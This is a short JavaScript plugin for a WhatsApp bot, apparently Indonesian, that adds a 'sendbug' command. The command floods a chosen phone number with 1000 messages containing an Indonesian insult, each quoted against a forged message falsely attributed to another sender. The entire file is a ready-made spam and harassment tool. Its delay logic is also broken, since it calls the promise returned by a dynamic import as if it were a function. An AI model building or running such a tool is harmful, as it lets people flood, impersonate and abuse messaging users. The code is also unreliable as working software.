let handler  = async (m, { conn, text, command, participants }) => {
if (!text)return m.reply('Contoh Penggunaan Command <nomor>')
const num = text + '@s.whatsapp.net'
const vyn = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": "Semoga Harimu Senin Terus",
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "@s.whatsapp.net"
}}}}
						const jumlah = '1000'
						const waktu = '15s'
						const toMs = import("ms");
						const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
						for (let i = 0; i < jumlah; i++) {
							conn.sendMessage(m.chat, { react: { key: m.key, text: '😁'}}).then( res => conn.sendMessage(num, { text: 'WA GB ANJEENG' }, { quoted: vyn }))
							await sleep(toMs(waktu))
						}
            }
handler.command = /^(sendbug)$/i
handler.premium = false
handler.owner = true

export default handler